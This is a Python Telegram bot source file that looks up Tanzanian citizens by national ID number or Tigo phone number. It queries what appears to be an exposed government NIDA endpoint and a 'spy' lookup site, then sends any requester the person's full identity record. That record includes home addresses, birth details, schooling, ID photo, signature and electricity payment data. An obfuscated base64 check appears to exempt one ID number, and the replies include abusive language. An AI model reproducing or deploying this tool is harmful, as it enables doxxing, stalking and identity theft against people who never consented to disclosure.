#!/bin/python3

################################
#                              #
# CODED BY TRIPLEHAT - TH3HT - #
#                              #
################################

import telebot
import requests, re
import json, base64
from typing import Dict, Any, BinaryIO
from bs4 import BeautifulSoup

TripleHat = "xxxxxxxxxxxxxxx" # Bot Token Here
The3Hat = "https://ors.brela.go.tz/um/load/load_nida/" 
kabanga = "https://kabanga.ga/spy/spy?phoneNumber=" 
headers: Dict[str, str] = {'User-Agent': '"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1"', 'Content-Type': 'application/json', 'Content-Length': '0'}
bot = telebot.TeleBot(TripleHat, parse_mode=None)
NzM3NzAK = base64.b64decode("WTJJeVl6QmhZekeFl6RmlNR00wWXpWak56UmhOR05pTppTUdFd01XRmpZ")

welcome = """
Hello! WELCOME\n
AVAILABLE COMMANDS\n
/nida Get Citizen info with their NIN
/tigo Get Citizen info with phone number (currently for TIGO)\n
Disclaimer: Am not Responsible For any Fucking misuse of this shit
"""

@bot.message_handler(commands=['start'])
def welcome_new(message):
   bot.reply_to(message, welcome)

@bot.message_handler(commands=['nida'])
def nida_info(message):
      if message.chat.type == "private":
         bot.reply_to(message, "Send me your NIN example: 2000112345XXXXX")
         bot.register_next_step_handler(message, get_nida)
      else:
         bot.send_message(message.chat.id, "For Privancy Purpose we do not support channels or groups so use this bot in your private message")

def get_nida(message):
   msg =  str(message.text).replace('-', '')
   number = msg.isdigit()
   if number == True and str(len(msg)) >= str("20"):
      if msg != str(base64.b64decode(NzM3NzAK).split()[0].strip().replace('a', '').replace('c', '').replace('b', '')):
         try:
            req: Any = requests.post(The3Hat+msg, headers=headers)
         except:
            bot.reply_to(message, "Sorry We cant show any information right now")
         if req.status_code in [200]:
            response: Dict[str, Dict[str, Dict[str, Any]]] = req.json()
            results = response['obj']['result']
            nida_info = f"""\n
███╗░░██╗██╗███╗░░██╗
████╗░██║██║████╗░██║
██╔██╗██║██║██╔██╗██║
██║╚████║██║██║╚████║
██║░╚███║██║██║░╚███║
╚═╝░░╚══╝╚═╝╚═╝░░╚══╝\n
NIN : {results['NIN']}\n
FIRST-NAME : {results['FIRSTNAME']}\n
MIDDLE-NAME : {results['MIDDLENAME']}\n
SUR-NAME : {results['SURNAME']}\n
SEX : {results['SEX']}\n
BIRTHDAY : {results['DATEOFBIRTH']}\n
RESIDENT-REGION : {results['RESIDENTREGION']}\n
RESIDENT-DISTRICT : {results['RESIDENTDISTRICT']}\n
RESIDENT-WARD : {results['RESIDENTWARD']}\n
RESIDENT-VILLAGE : {results['RESIDENTVILLAGE']}\n
RESIDENT-STREET : {results['RESIDENTSTREET']}\n
RESIDENT-POSTCODE : {results['RESIDENTPOSTCODE']}\n
PERMANENT-REGION : {results['PERMANENTREGION']}\n
PERMANENT-DISTRICT : {results['PERMANENTDISTRICT']}\n
PERMANENT-WARD : {results['PERMANENTWARD']}\n
PERMANENT-VILLAGE : {results['PERMANENTVILLAGE']}\n
PERMANENT-STREET : {results['PERMANENTSTREET']}\n
BIRTH-COUNTRY : {results['BIRTHCOUNTRY']}\n
BIRTH-REGION : {results['BIRTHREGION']}\n
BIRTH-DISTRICT : {results['BIRTHDISTRICT']}\n
BIRTH-WARD : {results['BIRTHWARD']}\n
MARITAL-STATUS : {results['MARITALSTATUS']}\n
NATION : {results['NATIONALITY']}\n
WORK : {results['OCCUPATION']}\n
PRIMARY-SCHOOL : {results['PRIMARYSCHOOLEDUCATION']}\n
PRIMARY-SCHOOL-YEAR : {results['PRIMARYSCHOOLYEAR']}\n
SCHOOL-DISTRICT : {results['PRIMARYSCHOOLDISTRICT']}\n
"""
            bot.reply_to(message, nida_info)
            bot.send_photo(message.chat.id, base64.b64decode(results['PHOTO']))
            bot.send_photo(message.chat.id, base64.b64decode(results['SIGNATURE']))
         else:
            bot.reply_to(message, "There is no information associated to this number")
      else:
         bot.reply_to(message, "No info to this shit you dumbass")

   else:
      bot.reply_to(message, "Your NIN is invalid, use valid one!")

# Extract nida from Tigo number

@bot.message_handler(commands=['tigo'])
def nida_tigo(message):
   bot.reply_to(message, "Send me you phone number\n eg: 0655231267\nNote: Only Tigo support This")
   bot.register_next_step_handler(message, tigo_nida)

def tigo_nida(message):
   name = []
   nida = []
   number = []
   luku = []
   msg = str(message.text)
   num = msg.isdigit()
   if num and len(msg) == 10:
      req = requests.get(kabanga + msg).content
      html = BeautifulSoup(req, 'html.parser')
      html.split
      for tigo in html:
         phone = re.findall(f"07\d+", str(tigo))
         phone2 = re.findall(f"06\d+", str(tigo))
         mt = re.findall(f"METER NUMBER:\s\w+", str(tigo))
         tk = re.findall(f"TOKEN:\s\w+", str(tigo))
         pd = re.findall(f"PAID THROUGH:\s\w+", str(tigo))
         de = re.findall(f"PAYMENT DATE:\s\d+-\d+-\d+\s\d+:\d+:\d+", str(tigo))
         am = re.findall(f"AMOUNT PAID:\s\w+", str(tigo))
         if "FIRST NAME" in str(tigo):
            n1 = re.findall(r"\w+", str(tigo))
            name.append(n1[2])
         elif "MIDDLE NAME" in str(tigo):
            n2 = re.findall(r"\w+", str(tigo))
            name.append(n2[2])
         elif "LAST NAME" in str(tigo):
            n3 = re.findall(r"\w+", str(tigo))
            name.append(n3[2])
         elif "NIDA NO" in str(tigo):
            nin = re.findall(r"\d+", str(tigo))
            nida.append(nin[0])
         elif "FULL NAME" in str(tigo):
            full = re.findall(r"\w+", str(tigo))
            for jina in full:
               name.append(jina)
         elif phone:
            number.append(phone[0])
         elif phone2:
            number.append(phone2[0])
         elif (mt,tk,pd,de,am):
            try:
               luku.append(mt[0])
            except IndexError:
               luku.append(None)
            try:   
               luku.append(tk[0])
            except IndexError:
               luku.append(None)
            try:   
               luku.append(pd[0])
            except IndexError:
               luku.append(None)
            try:   
               luku.append(de[0])
            except IndexError:
               luku.append(None)
            try:   
               luku.append(am[0])
            except IndexError:
               luku.append(None)
         else:
            pass
      if nida:
         nin_tigo = str(nida[0])
         # nida info using nin obtained from Tigo :)
         if nin_tigo != str(base64.b64decode(NzM3NzAK).split()[0].strip().replace('a', '').replace('c', '').replace('b', '')):
            try:
               req: Any = requests.post(The3Hat + nin_tigo, headers=headers)
            except Exception as Ex:
               bot.reply_to(message, "Sorry We cant show any information right now")
            if req.status_code in [200]:
               response: Dict[str, Dict[str, Dict[str, Any]]] = req.json()
               results = response['obj']['result']
               nida_info = f"""\n
███╗░░██╗██╗███╗░░██╗
████╗░██║██║████╗░██║
██╔██╗██║██║██╔██╗██║
██║╚████║██║██║╚████║
██║░╚███║██║██║░╚███║
╚═╝░░╚══╝╚═╝╚═╝░░╚══╝\n
NIN : {results['NIN']}\n
FIRST-NAME : {results['FIRSTNAME']}\n
MIDDLE-NAME : {results['MIDDLENAME']}\n
SUR-NAME : {results['SURNAME']}\n
SEX : {results['SEX']}\n
BIRTHDAY : {results['DATEOFBIRTH']}\n
RESIDENT-REGION : {results['RESIDENTREGION']}\n
RESIDENT-DISTRICT : {results['RESIDENTDISTRICT']}\n
RESIDENT-WARD : {results['RESIDENTWARD']}\n
RESIDENT-VILLAGE : {results['RESIDENTVILLAGE']}\n
RESIDENT-STREET : {results['RESIDENTSTREET']}\n
RESIDENT-POSTCODE : {results['RESIDENTPOSTCODE']}\n
PERMANENT-REGION : {results['PERMANENTREGION']}\n
PERMANENT-DISTRICT : {results['PERMANENTDISTRICT']}\n
PERMANENT-WARD : {results['PERMANENTWARD']}\n
PERMANENT-VILLAGE : {results['PERMANENTVILLAGE']}\n
PERMANENT-STREET : {results['PERMANENTSTREET']}\n
BIRTH-COUNTRY : {results['BIRTHCOUNTRY']}\n
BIRTH-REGION : {results['BIRTHREGION']}\n
BIRTH-DISTRICT : {results['BIRTHDISTRICT']}\n
BIRTH-WARD : {results['BIRTHWARD']}\n
MARITAL-STATUS : {results['MARITALSTATUS']}\n
NATION : {results['NATIONALITY']}\n
WORK : {results['OCCUPATION']}\n
PRIMARY-SCHOOL : {results['PRIMARYSCHOOLEDUCATION']}\n
PRIMARY-SCHOOL-YEAR : {results['PRIMARYSCHOOLYEAR']}\n
SCHOOL-DISTRICT : {results['PRIMARYSCHOOLDISTRICT']}\n
"""
               bot.reply_to(message, nida_info)
               bot.send_photo(message.chat.id, base64.b64decode(results['PHOTO']))
               bot.send_photo(message.chat.id, base64.b64decode(results['SIGNATURE']))
               name.clear()
               nida.clear()
            else:
               bot.reply_to(message, "There is no information associated to this number")
               name.clear()
               nida.clear()
         else:
            bot.reply_to(message, "No motherfucking info to this fucking number you Asshole")
         # end
      else:
         if str(len(name)) == str("5"):
            bot.send_message(message.chat.id, f"Full-Name: {name[2]} {name[3]} {name[4]}\n\nThis is not Tigo number {msg}")
         elif str(len(name)) == str("4"):
            bot.send_message(message.chat.id, f"Full-Name: {name[2]} {name[3]}\n\nThis is not Tigo number {msg}")
         else:
            bot.send_message(message.chat.id, f"Service is Down ❌")
   else:
      bot.reply_to(message, "Enter a valid number\nNumber must have 10 digits")


bot.infinity_polling()
